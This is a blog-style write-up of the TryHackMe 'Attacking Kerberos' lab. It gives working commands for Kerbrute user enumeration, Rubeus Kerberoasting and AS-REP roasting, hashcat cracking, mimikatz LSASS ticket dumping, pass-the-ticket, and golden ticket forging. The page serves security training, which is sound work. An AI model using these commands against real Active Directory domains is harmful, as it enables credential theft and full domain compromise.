<!doctype html><html><meta http-equiv=content-type content="text/html" charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Attacking Kerberos</title><link rel="shortcut icon" href=https://schmid7k.github.io/s-for-security/images/favicon.png type=image/png><meta name=description content="Tips, tricks and write ups for Capture the Flag challenges."><meta name=keywords content="writeups,penetration-testing,cybersecurity,tryhackme,hackthebox"><meta name=referrer content="no-referrer-when-downgrade"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://schmid7k.github.io/s-for-security/css/screen.css><link rel=stylesheet href=https://schmid7k.github.io/s-for-security/css/fonts.css type=text/css><link rel=stylesheet href=https://schmid7k.github.io/s-for-security/fork-awesome/css/fork-awesome.min.css type=text/css><meta property="og:title" content="Attacking Kerberos"><meta property="og:description" content="This write up refers to the Attacking Kerberos room on TryHackMe.
Task 1: Introduction In this room we are familiarizing ourselves with Kerberos, the windows ticket-granting service.
The task description gives a summary on Kerberos&rsquo; components, how its ticket system works, common terminology when working with Kerberos as well as what requirements are needed for different attacks.
All task related questions can be answered by reading the summary on Kerberos."><meta property="og:type" content="article"><meta property="og:url" content="https://schmid7k.github.io/s-for-security/posts/tryhackme/cyber_defense/attacking_kerberos/"><meta property="og:image" content="https://schmid7k.github.io/s-for-security/images/cover-image.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-07T16:18:23+02:00"><meta property="article:modified_time" content="2022-04-07T16:18:23+02:00"><meta property="og:site_name" content="S for Security"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://schmid7k.github.io/s-for-security/images/cover-image.jpg"><meta name=twitter:title content="Attacking Kerberos"><meta name=twitter:description content="This write up refers to the Attacking Kerberos room on TryHackMe.
Task 1: Introduction In this room we are familiarizing ourselves with Kerberos, the windows ticket-granting service.
The task description gives a summary on Kerberos&rsquo; components, how its ticket system works, common terminology when working with Kerberos as well as what requirements are needed for different attacks.
All task related questions can be answered by reading the summary on Kerberos."><meta itemprop=name content="Attacking Kerberos"><meta itemprop=description content="This write up refers to the Attacking Kerberos room on TryHackMe.
Task 1: Introduction In this room we are familiarizing ourselves with Kerberos, the windows ticket-granting service.
The task description gives a summary on Kerberos&rsquo; components, how its ticket system works, common terminology when working with Kerberos as well as what requirements are needed for different attacks.
All task related questions can be answered by reading the summary on Kerberos."><meta itemprop=datePublished content="2022-04-07T16:18:23+02:00"><meta itemprop=dateModified content="2022-04-07T16:18:23+02:00"><meta itemprop=wordCount content="1098"><meta itemprop=image content="https://schmid7k.github.io/s-for-security/images/cover-image.jpg"><meta itemprop=keywords content><body><main class="content page-template page-" role=main><article class="post page"><header class=post-header><a id=blog-logo href=/s-for-security/>S for Security</a></header><h1 class=post-title>Attacking Kerberos</h1><section class=post-content><p>This write up refers to the <a href=https://tryhackme.com/room/attackingkerberos>Attacking Kerberos</a> room on <a href=https://tryhackme.com/>TryHackMe</a>.</p><h4 id=task-1-introduction>Task 1: Introduction</h4><p>In this room we are familiarizing ourselves with Kerberos, the windows ticket-granting service.</p><p>The task description gives a summary on Kerberos&rsquo; components, how its ticket system works, common terminology when working with Kerberos as well as what requirements are needed for different attacks.</p><p>All task related questions can be answered by reading the summary on Kerberos.</p><h5 id=question-1-what-does-tgt-stand-for>Question 1) What does TGT stand for?</h5><p><strong>Solution:</strong> Ticket Granting Ticket</p><h5 id=question-2-what-does-spn-stand-for>Question 2) What does SPN stand for?</h5><p><strong>Solution:</strong> Service Principal Name</p><h5 id=question-3-what-does-pac-stand-for>Question 3) What does PAC stand for?</h5><p><strong>Solution:</strong> Privilege Attribute Certificate</p><h5 id=question-4-what-two-services-make-up-the-kdc>Question 4) What two services make up the KDC?</h5><p><strong>Solution:</strong> AS, TGS</p><h5 id=question-5>Question 5)</h5><p>Deploy the machine and click the <code>Completed</code> button.</p><h4 id=task-2-enumeration-w-kerbrute>Task 2: Enumeration w/ Kerbrute</h4><p>Before we can tackle the questions attached to this task we need to take care of some pre-requisites. First of all we need to add the DNS domain name and the target machine IP to <code>/etc/hosts</code>. Then we can download a precompiled Kerbrute binary from <a href=https://github.com/ropnop/kerbrute/releases>GitHub</a>, rename it to just <code>kerbrute</code> and make it executable <code>chmod +x kerbrute</code>. Now qw download the wordlist attached to the task and we can start brute forcing user accounts on the target machine with this command:</p><pre tabindex=0><code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local &lt;wordlist&gt;
</code></pre><p>This gives us enough information to answer the questions.</p><h5 id=question-6-how-many-totals-users-do-we-enumerate>Question 6) How many totals users do we enumerate?</h5><p><strong>Solution:</strong> 10</p><h5 id=question-7-what-is-the-sql-service-account-name>Question 7) What is the SQL service account name?</h5><p><strong>Solution:</strong> SQLService</p><h5 id=question-8-what-is-the-second-machine-account-name>Question 8) What is the second &ldquo;machine&rdquo; account name?</h5><p><strong>Solution:</strong> Machine2</p><h5 id=question-9-what-is-the-third-user-account-name>Question 9) What is the third &ldquo;user&rdquo; account name?</h5><p><strong>Solution:</strong> User3</p><h4 id=task-3-harvesting--brute-forcing-tickets-w-rubeus>Task 3: Harvesting & Brute-Forcing Tickets w/ Rubeus</h4><p>For this task we need to SSH into the machine with the given credentials. Once we are on the machine we can <code>cd Downloads</code> to navigate to the directory where a precompiled <code>Rubeus.exe</code> was left for us. Using this executable we can begin harvesting Ticket Granting Tickets (TGTs).</p><pre tabindex=0><code>Rubeus.exe harvest /interval:30
</code></pre><p>This is enough to answers this task&rsquo;s questions.</p><h5 id=question-10-which-domain-admin-do-we-get-a-ticket-for-when-harvesting-tickets>Question 10) Which domain admin do we get a ticket for when harvesting tickets?</h5><p><strong>Solution:</strong> Administrator</p><h5 id=question-11-which-domain-controller-do-we-get-a-ticket-for-when-harvesting-tickets>Question 11) Which domain controller do we get a ticket for when harvesting tickets?</h5><p><strong>Solution:</strong> CONTROLLER-1</p><h4 id=task-4-kerberoasting-w-rubeus--impacket>Task 4: Kerberoasting w/ Rubeus & Impacket</h4><p>This rooms task description summarizes one of the most popular Kerberos attacks called Kerberoasting. It explains how to take advantage of it and how to mitigate against this kind of attack.</p><p>Luckily the <code>Rubeus.exe</code> on the target machine is enough to carry out this attack, so we can navigate into the <code>Downloads</code> directory again and execute</p><pre tabindex=0><code>Rubeus.exe kerberoast
</code></pre><p>to dump the Kerberos hash of all users vulnerable to Kerberoasting. Copying these hashes over to our own machine allows us to crack them using <code>hashcat</code> and the modified rockyou wordlist that comes with the task.</p><pre tabindex=0><code>hashcat -m 13100 -a 0 hash.txt wordlist.txt
</code></pre><p>This will be all to answers this task&rsquo;s questions.</p><h5 id=question-12-what-is-the-httpservice-password>Question 12) What is the HTTPService Password?</h5><p><strong>Solution:</strong> Su*******0</p><h5 id=question-13-what-is-the-sqlservice-password>Question 13) What is the SQLService Password?</h5><p><strong>Solution:</strong> My***********#</p><h4 id=task-5-as-rep-roasting-w-rubeus>Task 5: AS-REP Roasting w/ Rubeus</h4><p>Much like Kerberoasting AS-REP roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. We can use this to our advantage by again using <code>Rubeus</code>.</p><pre tabindex=0><code>Rubeus.exe asreproast
</code></pre><p>Again we get a list of hashes from vulnerable users, we can copy them over to our machine and put them into a <code>hashes.txt</code>. However before we can crack them with <code>hashcat</code> we need to insert a <em>23$</em> after <em>$krb5asrep$</em> for every hash.</p><p>Then we can brute force them with the same wordlist as in task 4.</p><pre tabindex=0><code>hashcat -m 18200 hashes.txt wordlist.txt
</code></pre><h5 id=question-14-what-hash-type-does-as-rep-roasting-use>Question 14) What hash type does AS-REP Roasting use?</h5><p>Looking through the <code>hashcat</code> help menu gives us the answer to this question.</p><p><strong>Solution:</strong> Kerberos 5 AS-REP etype 23</p><h5 id=question-15-which-user-is-vulnerable-to-as-rep-roasting>Question 15) Which User is vulnerable to AS-REP roasting?</h5><p><strong>Solution:</strong> User3</p><h5 id=question-16-what-is-the-users-password>Question 16) What is the User&rsquo;s Password?</h5><p><strong>Solution:</strong> P*******3</p><h5 id=question-17-which-admin-is-vulnerable-to-as-rep-roasting>Question 17) Which Admin is vulnerable to AS-REP roasting?</h5><p><strong>Solution:</strong> Admin2</p><h5 id=question-18-what-is-the-admins-password>Question 18) What is the Admin&rsquo;s Password?</h5><p><strong>Solution:</strong> P*******2</p><h4 id=task-6-pass-the-ticket-w-mimikatz>Task 6: Pass the Ticket w/ mimikatz</h4><p>The next attack we get to take a look at is the pass the ticket attack. This attack dumps the Ticket Granting Ticket (TGT) from the Local Security Authority Subsystem Service (LSASS) memory of the machine. The dumped ticket can then be used to gain domain admin privileges, if a domain admin ticket was in the LSASS memory.</p><p>This attack can be executed on the target machine using mimikatz.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>mimikatz</span>.<span style=color:#a6e22e>exe</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>privilege</span><span style=color:#f92672>::</span><span style=color:#a6e22e>debug</span> <span style=color:#75715e>// Check if we have administrator privileges
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>sekurlsa</span><span style=color:#f92672>::</span><span style=color:#a6e22e>tickets</span> <span style=color:#f92672>/</span><span style=color:#66d9ef>export</span> <span style=color:#75715e>// Export all .kirbi tickets into the current directory
</span></span></span></code></pre></div><p>Check through the extracted tickets and look for an administrator ticket from krbtgt.</p><p>With the ticket we can finally execute the actual Pass the Ticket attack with mimikatz.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>kerberos</span><span style=color:#f92672>::</span><span style=color:#a6e22e>ptt</span> <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>ticket</span><span style=color:#f92672>&gt;</span> <span style=color:#75715e>// Replace &lt;ticket&gt; with the ticket you found earlier
</span></span></span></code></pre></div><p>We can verify that the attack was successful by exiting mimikatz and executing <code>klist</code>. The output should tell us that we are that user we were trying to impersonate.</p><h5 id=question-19>Question 19)</h5><p>Click the <code>Completed</code> button and continue.</p><h4 id=task-7-goldensilver-ticket-attacks-w-mimikatz>Task 7: Golden/Silver Ticket Attacks w/ mimikatz</h4><p>This task explains the Golden/Silver ticket attack against Kerberos by using mimikatz. This attack works by dumping the ticket-granting ticket of a user on the domain, preferably a domain admin (for a silver ticket) or the krbtgt ticket (for a golden ticket).</p><p>If we wanted to create a golden ticket we would execute the following steps.</p><pre tabindex=0><code>mimikatz.exe
privilege::debug // Check for administrator privileges
lsadump::lsa /inject /name:krbtgt // Dump the has and security identifier needed to create a Golden Ticket. Change /name: to the name of a service or domain admin account if you want a Silver Ticket instead
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:500 // Command for creating a golden ticket.
misc::cmd // Open a new elevated command prompt with the given ticket in mimikatz
</code></pre><h5 id=question-20-what-is-the-sqlservice-ntlm-hash>Question 20) What is the SQLService NTLM Hash?</h5><p><strong>Solution:</strong> c******************************a</p><h5 id=question-21-what-is-the-administrator-ntlm-hash>Question 21) What is the Administrator NTLM Hash?</h5><p><strong>Solution:</strong> 2******************************6</p><h4 id=task-8-kerberos-backdoors-w-mimikatz>Task 8: Kerberos Backdoors w/ mimikatz</h4><p>This task teaches us how to create a skeleton key for persistent access to a Kerberos domain. There is no real question attached to this task so we can learn about skeleton keys when we want to.</p><h5 id=question-22>Question 22)</h5><p>Click the <code>Completed</code> button and continue.</p><h4 id=task-9-conclusion>Task 9: Conclusion</h4><p>Congratulations, you finished the <a href=https://tryhackme.com/room/attackingkerberos>Attacking Kerberos</a> room on <a href=https://tryhackme.com/>TryHackMe</a>!</p><p>If you want to learn more about Kerberos and how to exploit it take a look at the following resources:</p><ul><li><a href=https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a>https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a</a></li><li><a href=https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat>https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat</a></li><li><a href=https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1>https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1</a></li><li><a href=https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/>https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></li><li><a href=https://www.varonis.com/blog/kerberos-authentication-explained/>https://www.varonis.com/blog/kerberos-authentication-explained/</a></li><li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf</a></li><li><a href=https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf>https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf</a></li><li><a href=https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf>https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf</a></li></ul><h5 id=question-23>Question 23)</h5><p>Click on the <code>Completed</code> button to finish the room.</p></section></article></main><footer class=site-footer><div class=inner><section class=copyright>©Schmid7k</section><section></section><section><a href=https://themes.gohugo.io/hugo-scroll/>Design</a> template
built with ♥️ by
<a href=https://www.janraasch.com title="Jan Raasch">Jan Raasch</a></section></div></footer><script type=text/javascript src=https://schmid7k.github.io/s-for-security/js/jquery-1.11.3.min.js></script>
<script type=text/javascript src=https://schmid7k.github.io/s-for-security/js/icons.js></script>
<script type=text/javascript src=https://schmid7k.github.io/s-for-security/js/index.js></script></body></html>